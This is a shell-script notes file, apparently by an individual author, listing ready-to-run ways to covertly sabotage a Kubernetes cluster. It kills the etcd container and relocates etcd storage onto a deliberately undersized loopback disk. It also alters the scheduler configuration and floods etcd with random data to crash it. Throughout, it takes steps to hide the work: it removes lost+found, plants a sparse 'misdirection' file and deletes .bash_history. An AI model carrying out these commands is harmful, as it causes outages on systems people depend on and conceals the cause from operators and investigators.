#!/usr/bin/env sh
echo "This isn't meant to be run as a script, open it in an editor"
exit

# Author: William Lightning
#   E-mail: kassah@gmail.com
#   Twitter: @kassah
#   LinkedIn: https://www.linkedin.com/in/william-lightning-8498a524/

# IDEA: Move etcd storage to a super small disk
systemctl stop kubelet
# kill etcd
ETCD_CTR=$(ctr -n k8s.io c ls | grep k8s.gcr.io/etcd | cut -d " " -f 1)
ctr -n k8s.io t kill -s SIGKILL ${ETCD_CTR}
ctr -n k8s.io c rm ${ETCD_CTR}

# create small loopback disk
mkdir -p /var/local/etcd
# tune the count a bit, may take a couple of trys to only get a few ks left on the disk in question after etcd data is copied in.
dd if=/dev/zero of=/var/local/etcd/loopbackfile.img bs=1M count=281
losetup -fP /var/local/etcd/loopbackfile.img
LOOP=$(losetup -a | grep /var/local/etcd/loopbackfile.img | cut -d ":" -f 1)
mkfs.ext4 /var/local/etcd/loopbackfile.img
tune2fs -r 0 -m 0 /var/local/etcd/loopbackfile.img
mount -o loop ${LOOP} /srv
df -hP /srv
du -sh /var/lib/etcd
cp -rp /var/lib/etcd/member /srv/
tar -cvf /opt/containerd/lib/backup.tar /var/lib/etcd/member
rm -rf /var/lib/etcd/member
umount /srv
mount -o loop ${LOOP} /var/lib/etcd
systemctl start kubelet
df -hP /var/lib/etcd
# get rid of tell-tale sign of this being a mount.
rm -rf /var/lib/etcd/lost+found

# Misdirection
dd of=/var/lib/etcd/member/fillmeup bs=1 seek=50G count=0

# Create a minutely cronjob.. will this actually kill it off? it would eventually.
kubectl create -f https://k8s.io/examples/application/job/cronjob.yaml


# IDEA: Break Kube Scheduler (a small cut, I hope)
# in /etc/kubernetes/manifests/kube-scheduler.yaml
# add to arguments:
- --write-config-to=/etc/kubernetes/config.con



# IDEA: write some content to etcd that'll take up some space, this should speed up the death of etcd.
ETCD_VER=v3.5.0
ETCD_BIN=/opt/containerd/lib/etcd

GOOGLE_URL=https://storage.googleapis.com/etcd
GITHUB_URL=https://github.com/etcd-io/etcd/releases/download

DOWNLOAD_URL=${GITHUB_URL}
rm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz
rm -rf $ETCD_BIN
mkdir -p $ETCD_BIN
curl -L ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz -o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz

tar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz -C $ETCD_BIN --strip-components=1
rm /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz
PATH=${PATH}:${ETCD_BIN}

export ETCDCTL_DIAL_TIMEOUT=3s
export ETCDCTL_CACERT=/etc/kubernetes/pki/etcd/ca.crt
export ETCDCTL_CERT=/etc/kubernetes/pki/etcd/server.crt
export ETCDCTL_KEY=/etc/kubernetes/pki/etcd/server.key
export ETCDCTL_ENDPOINTS=https://127.0.0.1:2379

# let's write 1MB at a time to etcd.. to KILL it!
dd if=/dev/urandom of=/tmp/fillmeup bs=100 count=10000
etcdctl put /fillmeup < /tmp/fillmeup
for i in {1..100}; do 
  etcdctl put /fillmeup${i} < /tmp/fillmeup
done
rm /tmp/fillmeup

# Clean up .bash_history to remove hints
rm -rf .bash_history
exit
# start new connection
rm -rf .bash_history
exit

